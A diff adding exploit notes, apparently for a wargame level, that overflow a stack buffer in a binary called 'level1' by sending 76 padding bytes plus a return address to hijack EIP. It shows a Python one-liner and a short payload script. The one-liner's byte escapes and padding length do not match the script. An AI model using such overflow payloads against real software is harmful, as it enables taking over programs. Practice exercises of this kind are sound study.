@@ -47,3 +47,12 @@
    0x08048f80 <+192>:   mov    eax,0x0
    0x08048f85 <+197>:   leave
    0x08048f86 <+198>:   ret
+
+
+   0x08048444
+   \x44\x84\x04\x08
+   python -c "print('aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppaaaabbbbcccczzzz/x44/x84/x04/x08')" | ./level1
+
+padding = "A"*76
+eip = "\x44\x84\x04\x08"
+print padding+eip
